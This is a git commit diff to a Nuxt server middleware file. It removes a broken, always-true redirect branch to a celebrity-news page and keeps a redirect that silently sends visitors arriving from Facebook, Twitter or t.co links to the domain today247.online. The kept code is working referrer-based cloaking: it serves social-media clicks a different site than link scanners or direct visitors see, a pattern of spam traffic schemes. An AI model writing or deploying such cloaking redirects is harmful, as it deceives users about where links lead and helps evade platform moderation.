fba179e44da8bc3d2345a5aeeea52a7710ff00b0
devzota <111525617+devzota@users.noreply.github.com>
2023-05-08 21:19:00 +0700

    1
    2

--- server/middleware/[...slug].ts
+++ server/middleware/[...slug].ts
@@ -13,11 +13,7 @@
 export default defineEventHandler((event) => {
     const headers = event.req.headers;
     
-    if ('https://test-zt.vercel.app/taylor-swift-nashville-concert-forecast-storms-likely-sunday/') {
-        sendRedirect(event,"https://atoz24h.info/how-camila-cabello-maintained-her-shaggy-waves-all-night-at-the-2023-grammys/");
-    }
-    else (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
+    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
         sendRedirect(event,"https://today247.online"+event.req.url);
     }
-    
 })
